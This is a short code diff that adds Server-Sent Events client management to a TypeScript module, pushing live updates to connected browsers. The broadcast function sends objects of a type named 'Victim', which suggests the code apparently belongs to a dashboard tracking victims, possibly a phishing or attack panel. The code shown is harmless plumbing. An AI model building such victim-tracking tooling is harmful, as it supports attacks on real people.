@@ -126,3 +126,32 @@ export function resetSessions(): void {
         Unknown: 0,
     };
 }
+
+// ============================================
+// SSE (Server-Sent Events) Client Management
+// Moved here to avoid route import anti-pattern
+// ============================================
+
+const clients: Set<ReadableStreamDefaultController> = new Set();
+
+export function addClient(controller: ReadableStreamDefaultController): void {
+    clients.add(controller);
+}
+
+export function removeClient(controller: ReadableStreamDefaultController): void {
+    clients.delete(controller);
+}
+
+export function notifyClients(victim: Victim): void {
+    const data = JSON.stringify(victim);
+    const message = `data: ${data}\n\n`;
+
+    clients.forEach((controller) => {
+        try {
+            controller.enqueue(new TextEncoder().encode(message));
+        } catch {
+            // Client disconnected, remove from set
+            clients.delete(controller);
+        }
+    });
+}
